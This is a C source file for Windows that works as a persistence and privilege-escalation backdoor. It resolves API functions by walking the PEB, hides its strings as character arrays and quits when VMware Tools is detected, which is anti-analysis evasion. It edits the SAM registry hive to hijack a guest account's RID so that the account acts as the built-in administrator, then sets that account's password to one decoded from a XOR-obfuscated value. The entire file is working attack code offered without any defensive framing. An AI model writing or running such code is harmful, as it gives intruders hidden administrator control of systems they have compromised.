#include <Windows.h>
#include "peb_lookup.h"

typedef UINT(WINAPI* WinExec_t)(LPCSTR, UINT);
typedef HMODULE(WINAPI* LoadLibraryA_t)(LPCSTR);
typedef LPCSTR(WINAPI* lstrcatA_t)(LPSTR, LPCSTR);
typedef int(WINAPIV* wsprintfA_t)(LPSTR, LPCSTR, ...);
typedef FARPROC(WINAPI* GetProcAddress_t)(HMODULE, LPCSTR);
typedef DWORD(WINAPI* NetUserSetInfo_t)(LPWSTR, LPWSTR, DWORD, PBYTE, PDWORD);
typedef LSTATUS(WINAPI* RegOpenKeyExA_t)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS(WINAPI* RegSetKeyValueA_t)(HKEY, LPCSTR, LPCSTR, DWORD, LPCVOID, DWORD);
typedef LSTATUS(WINAPI* RegGetValueA_t)(HKEY, LPCSTR, LPCSTR, DWORD, LPDWORD, LPVOID, LPDWORD);


typedef struct _USER_INFO_1003 {
	LPWSTR usri1003_password;
} USER_INFO_1003, * PUSER_INFO_1003, * LPUSER_INFO_1003;

inline void fix(wchar_t * buffer, wchar_t * key) {
	for (int i = 0; i < 60; i++) {
		buffer[i] ^= key[i];
	}
	buffer[59] = L'\0';
}

int main() {
	wchar_t kernel32_str[] = L"kernel32.dll";
	wchar_t username_str[] = L"BIOHAZARD_MGMT_GUEST";

	char user32_str[] = "user32.dll";
	char advapi32_str[] = "advapi32.dll";
	char netapi32_str[] = "netapi32.dll";
	char LoadLibraryA_str[] = "LoadLibraryA";
	char GetProcAddress_str[] = "GetProcAddress";

	// for some reason this can't be inlined properly 
	// if defined like the other strings will fail lookup after manual linking
	char WinExec_str[] = { 'W', 'i', 'n', 'E', 'x', 'e', 'c', '\0' };
	char wsprintfA_str[] = "wsprintfA";
	char lstrcatA_str[] = "lstrcatA";
	char RegGetValueA_str[] = "RegGetValueA";
	char RegSetKeyValueA_str[] = "RegSetKeyValueA";
	char CreateFileA_str[] = "CreateFileA";
	char CloseHandle_str[] = "CloseHandle";
	char RegOpenKeyExA_str[] = "RegOpenKeyExA";
	char NetUserSetInfo_str[] = "NetUserSetInfo";

	//char user_add_str[] = "cmd.exe /c net user GUEST_1 /add";
	char reg_users_key_str[] = { 'S','A','M','\\','S','A','M','\\','D','o','m','a','i','n','s','\\','A','c','c','o','u','n','t','\\','U','s','e','r','s','\\','\0' };
	char reg_username_key_str[] = { 'S','A','M','\\','S','A','M','\\','D','o','m','a','i','n','s','\\','A','c','c','o','u','n','t','\\','U','s','e','r','s','\\','N','a','m','e','s','\\','b','i','o','h','a','z','a','r','d','_','m','g','m','t','_','g','u','e','s','t','\0' };
	char F[] = { 'F', '\0' };
	char pass_change_cmd_str[] = { 'c','m','d','.','e','x','e',' ','/','c',' ','n','e','t',' ','u','s','e','r',' ','B','I','O','H','A','Z','A','R','D','_','M','G','M','T','_','G','U','E','S','T','\0' };

	wchar_t new_pass[] = L"\x84\x63\x8e\x53\x32\x3b\x37\x35\xd0\xc4\xaf\x79\x2c\x4b\xdb\xb6\xae\xdd\xac\x76\x9e\x93\x9d\x14\x41\x88\x94\xe5\x3f\x40\xbb\x3e\x3b\xbe\x59\x9a\xce\x90\x1b\xf2\x00\xc6\x32\x11\x85\x35\x2a\x57\x5d\x52\xbb\x19\xea\xa2\x77\x3b\x30\x5d\x68";
	wchar_t key[] = L"\xcc\x37\xcc\x28\x51\x4e\x44\x41\xe0\xa9\xf0\x2a\x1f\x39\xae\xdb\x83\x85\xf5\x29\xed\xfb\xae\x78\x2d\xeb\xa4\x81\x5a\x1f\x8f\x59\x0f\x8f\x37\xe9\xba\xcf\x53\xc6\x63\xad\x41\x65\xb6\x47\x75\x02\x33\x63\xcd\x2a\x98\xd1\x46\x4f\x49\x7c\x15";


	// resolve kernel32.dll address
	LPVOID kernel32_dll = get_module_by_name((const LPWSTR)kernel32_str);
	if (!kernel32_dll) return 1;

	// resolve LoadLibraryA() address
	LPVOID __load_lib = get_func_by_name((HMODULE)kernel32_dll, LoadLibraryA_str);
	if (!__load_lib) return 2;

	// resolve GetProcAddress() address
	LPVOID __get_proc = get_func_by_name((HMODULE)kernel32_dll, GetProcAddress_str);
	if (!__get_proc) return 3;

	// define functions
	LoadLibraryA_t _LoadLibraryA = (LoadLibraryA_t)__load_lib;
	GetProcAddress_t _GetProcAddress = (GetProcAddress_t)__get_proc;

	// Load user32.dll and advapi32.dll
	LPVOID user32_dll = _LoadLibraryA(user32_str);
	LPVOID advapi32_dll = _LoadLibraryA(advapi32_str);
	LPVOID netapi32_dll = _LoadLibraryA(netapi32_str);

	if (!user32_dll || !advapi32_dll || !netapi32_dll) return 4;

	// Load needed functions

	// Load kernel32.dll functions
	WinExec_t _WinExec = (WinExec_t)_GetProcAddress((HMODULE)kernel32_dll, WinExec_str);
	lstrcatA_t _lstrcatA = (lstrcatA_t)_GetProcAddress((HMODULE)kernel32_dll, lstrcatA_str);
	
	if (!_WinExec || !_lstrcatA) return 5;

	// Load advapi32.dll functions
	RegGetValueA_t _RegGetValueA = (RegGetValueA_t)_GetProcAddress((HMODULE)advapi32_dll, RegGetValueA_str);
	RegSetKeyValueA_t _RegSetKeyValueA = (RegSetKeyValueA_t)_GetProcAddress((HMODULE)advapi32_dll, RegSetKeyValueA_str);
	RegOpenKeyExA_t _RegOpenKeyExA = (RegOpenKeyExA_t)_GetProcAddress((HMODULE)advapi32_dll, RegOpenKeyExA_str);

	if (!_RegGetValueA || !_RegSetKeyValueA || !_RegOpenKeyExA) return 6;

	// Load user32.dll functions
	wsprintfA_t _wsprintfA = (wsprintfA_t)_GetProcAddress((HMODULE)user32_dll, wsprintfA_str);

	if (!_wsprintfA) return 7;

	// Load netapi32.dll functions
	NetUserSetInfo_t _NetUserSetInfo = (NetUserSetInfo_t)_GetProcAddress((netapi32_dll), NetUserSetInfo_str);
	
	if (!_NetUserSetInfo) return 8;
	//////////// DBG Checks!



	HKEY hKey;
	LSTATUS vm_status = _RegOpenKeyExA(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\VMware, Inc.\\VMware Tools"), 0, KEY_QUERY_VALUE, &hKey);
	if (vm_status == ERROR_SUCCESS) return 101;

	//////////// Execution

	// Add user
	// UINT winex_status = _WinExec(user_add_str, 0);
	// if (winex_status < 31) return 8;


	// Find RID of the newly added user
	LPDWORD __user_rid;
	LSTATUS status = _RegGetValueA(HKEY_LOCAL_MACHINE, reg_username_key_str, NULL, RRF_RT_ANY, &__user_rid, NULL, NULL);
	if (status != 0) return 9;

	char subkey[64];
	int f_size = 0x50;
	int user_rid = (int)__user_rid;
	char reg_F_value[0x50];

	_wsprintfA(subkey, "%s%08x\0", reg_users_key_str, user_rid);
	// Grab the F value
	status = _RegGetValueA(HKEY_LOCAL_MACHINE, subkey, F, RRF_RT_ANY, NULL, reg_F_value, &f_size);
	if (status != 0) return 10;
	
	// User is now "Default Admin"
	reg_F_value[0x30] = 0xf4;
	reg_F_value[0x31] = 0x01;

	// Set F value back
	status = _RegSetKeyValueA(HKEY_LOCAL_MACHINE, subkey, F, RRF_RT_ANY, reg_F_value, f_size);
	if (status != 0) return 11;


	fix(new_pass, key);

	// Change password
	DWORD dwLevel = 1003;
	USER_INFO_1003 ui;
	DWORD nStatus;

	ui.usri1003_password = new_pass;

	nStatus = _NetUserSetInfo(NULL, username_str, dwLevel, (LPBYTE)&ui, NULL);

	if (nStatus != 0) return 12;


	/*_wsprintfA(reg_F_value, "%s %s\0", pass_change_cmd_str, new_pass);
	int winex_status = _WinExec(reg_F_value, 0);
	if (winex_status < 31) return 12;*/

	return 0;
}